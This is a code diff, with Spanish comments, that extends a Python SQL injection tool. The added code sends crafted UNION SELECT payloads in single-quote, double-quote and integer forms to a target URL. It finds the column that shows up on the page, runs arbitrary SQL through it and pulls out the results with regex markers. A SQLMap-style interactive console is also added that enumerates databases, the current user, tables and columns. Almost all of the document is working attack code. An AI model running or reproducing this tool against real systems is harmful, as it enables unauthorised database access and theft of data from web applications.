@@ -1,8 +1,7 @@
-from random import random
 import requests
 import argparse
 import sys
-
+import re
 
 def realizar_peticion(url, params):
     """
@@ -73,10 +72,11 @@ def obtener_num_columnas(url, param_vulnerable, otros_params):
     print("[*] Calculando número de columnas...")
     
     # Diferentes prefijos según el tipo de inyección
+    # Usamos la forma AND para forzar la condición a FALSE y evitar resultados originales
     prefijos = [
-        ("comilla simple", "1' UNION SELECT "),
-        ("comilla doble", '1" UNION SELECT '),
-        ("entero", "1 UNION SELECT ")
+        ("comilla simple", "1' AND '1'='0' UNION SELECT "),
+        ("comilla doble", '1" AND "1"="0" UNION SELECT '),
+        ("entero", "1 AND 1=0 UNION SELECT ")
     ]
     
     for tipo, prefijo in prefijos:
@@ -120,24 +120,33 @@ def obtener_num_columnas(url, param_vulnerable, otros_params):
     print("[-] No se pudo determinar el número de columnas con UNION SELECT.")
     return None, None
 
-def encontrar_columna_visible(url, param_vulnerable, otros_params, num_cols):
+def encontrar_columna_visible(url, param_vulnerable, otros_params, num_cols, tipo_inyeccion):
     """
     Fase 2 Explotación: Determinar qué columna imprime datos en pantalla.
     """
     print("[*] Buscando columna visible...")
     
+    # Determinar prefijo según tipo de inyección
+    if tipo_inyeccion == "comilla simple":
+        prefijo = "1' AND '1'='0' UNION SELECT "
+        sufijo = " -- -"
+    elif tipo_inyeccion == "comilla doble":
+        prefijo = '1" AND "1"="0" UNION SELECT '
+        sufijo = " -- -"
+    else:  # entero
+        prefijo = "1 AND 1=0 UNION SELECT "
+        sufijo = " -- -"
+    
     # Creamos un payload tipo: UNION SELECT 1111, 2222, 3333...
     # Usamos números únicos para buscarlos en el HTML
     marcadores = [str(i)*4 for i in range(1, num_cols + 1)]
-    union_payload = f"1' UNION SELECT {','.join(marcadores)} -- -"
+    union_payload = f"{prefijo}{','.join(marcadores)}{sufijo}"
     
     params = otros_params.copy()
     params[param_vulnerable] = union_payload
     
-
     html = realizar_peticion(url, params)
     
-
     for i, marcador in enumerate(marcadores):
         if marcador in html:
             print(f"[+] Columna visible encontrada: {i + 1}")
@@ -145,6 +154,120 @@ def encontrar_columna_visible(url, param_vulnerable, otros_params, num_cols):
             
     print("[-] No se encontró ninguna columna visible (Blind SQLi?).")
     return None
+
+def extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query_sql, tipo_inyeccion):
+    """
+    Fase 3 Explotación: Extraer datos usando la columna visible.
+    """
+
+    # Determinar prefijo según tipo de inyección
+    if tipo_inyeccion == "comilla simple":
+        prefijo = "1' AND '1'='0' UNION SELECT "
+        sufijo = " -- -"
+    elif tipo_inyeccion == "comilla doble":
+        prefijo = '1" AND "1"="0" UNION SELECT '
+        sufijo = " -- -"
+    else:  # entero
+        prefijo = "1 AND 1=0 UNION SELECT "
+        sufijo = " -- -"
+
+    # Construimos la lista de columnas para el UNION
+    cols = [str(i) for i in range(1, num_cols + 1)]
+    
+    # En la columna visible, insertamos la query que queremos ejecutar con marcadores
+    # concat('SQLI', ..., 'SLQI') para facilitar la extracción
+    cols[col_visible - 1] = f"concat('SQLI', ({query_sql}), 'SLQI')"
+    
+    # Usamos -1 para que no haya resultados del registro original
+    payload = f"{prefijo}{','.join(cols)}{sufijo}"
+    
+    params = otros_params.copy()
+    params[param_vulnerable] = payload
+    
+    html = realizar_peticion(url, params)
+
+    # Extracción usando regex - buscamos TODAS las ocurrencias
+    matches = re.findall(r'SQLI(.*?)SLQI', html)
+    
+    # Filtrar: el dato real NO contiene "SELECT" (filtrar por si hay payload reflejado)
+    for match in matches:
+        if query_sql.upper() not in match.upper():
+            return match
+    
+    return "No se pudo extraer el dato"
+
+
+def menu_interactivo(url, param_vulnerable, otros_params, num_cols, col_visible, tipo_inyeccion):
+    """
+    Fase 4: Interactividad tipo SQLMap
+    """
+    print("\n" + "="*40)
+    print(" CONSOLA DE EXPLOTACIÓN SQLI ")
+    print("="*40)
+
+    bbdd = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
+    print(f"\n[+] Base de datos actual: {bbdd}")
+
+    print("\nOpciones:")
+    print("1. Obtener Bases de datos")
+    print("2. Usar Base de datos actual (la usada en el campo vulnerable)")
+    print("3. Obtener Usuario actual")
+    print("4. Listar Tablas")
+    print("5. Listar Columnas de una Tabla")
+    print("6. Salir")
+    
+    while True:
+        
+        opcion = input("\nSQLi> ")
+        
+        if opcion == '1':
+            query = "SELECT group_concat(schema_name) FROM information_schema.schemata"
+            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
+            print(f"\n[+] Bases de Datos: {res}")
+            res = res.split(',')
+            if res:
+                bbdd = input("Selecciona la base de datos a usar: ")
+                if bbdd in res:
+                    print(f"[+] Base de datos seleccionada: {bbdd}")
+                else:
+                    print("[-] Base de datos no válida, se usará la predeterminada.")
+                    bbdd = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
+            
+        elif opcion == '2':
+            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "database()", tipo_inyeccion)
+            print(f"\n[+] Base de Datos: {res}")
+            bbdd = res
+            
+        elif opcion == '3':
+            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, "user()", tipo_inyeccion)
+            print(f"\n[+] Usuario: {res}")
+            
+        elif opcion == '4':
+            # group_concat para sacar todo en una sola petición
+            query = f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{bbdd}'"
+            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
+            print(f"\n[+] Tablas: {res}")
+
+        elif opcion == '5':
+            tabla = input("Introduce el nombre de la tabla: ")
+            query = f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema='{bbdd}' AND table_name='{tabla}'"
+            res = extraer_dato(url, param_vulnerable, otros_params, num_cols, col_visible, query, tipo_inyeccion)
+            print(f"\n[+] Columnas de {tabla}: {res}")
+            
+        elif opcion == '6':
+            print("Saliendo...")
+            break
+        else:
+            print("Opción no válida")
+            print("\nOpciones:")
+            print("1. Obtener Bases de datos")
+            print("2. Usar Base de datos actual (la usada en el campo vulnerable)")
+            print("3. Obtener Usuario actual")
+            print("4. Listar Tablas")
+            print("5. Listar Columnas de una Tabla")
+            print("6. Salir")
+    
+
 
 def parse_args():
 
@@ -215,9 +338,9 @@ def main():
         num_columnas, tipo_inyeccion = obtener_num_columnas(target_url, vuln_param, otros_params)
 
         if num_columnas:
-            encontrar_columna_visible(target_url, vuln_param, otros_params, num_columnas)
-
-
+            col_visible = encontrar_columna_visible(target_url, vuln_param, otros_params, num_columnas, tipo_inyeccion)
+            if col_visible:
+                menu_interactivo(target_url, vuln_param, otros_params, num_columnas, col_visible, tipo_inyeccion)
     else:
         print("\n[-] No se detectó vulnerabilidad SQLi en la URL.")
     
